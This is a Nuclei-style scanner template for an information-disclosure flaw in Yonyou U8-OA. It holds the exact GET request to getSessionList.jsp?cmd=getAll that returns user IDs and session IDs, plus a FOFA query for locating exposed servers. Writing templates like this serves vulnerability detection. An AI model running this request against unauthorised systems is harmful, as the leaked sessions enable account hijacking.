id: U8_OA_getSessionList_uid
info:
  name: yonyou_U8_OA_getSessionList_uid
  author: mike
  severity: info
  description: 用友 U8 OA getSessionList.jsp文件，通过漏洞攻击者可以获取数据库中管理员的账户信息
  reference: https://www.cnblogs.com/pursue-security/p/17685227.html
  metadata:
    max-request: 1
    verified: true
    fofa-query: title="用友U8-OA"
http:
  - raw: 
    - |
      GET /yyoa/ext/https/getSessionList.jsp?cmd=getAll HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
      Accept-Encoding: gzip, deflate 

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "<usrID>"
          - "<sessionID>"
          - "<SessionList>"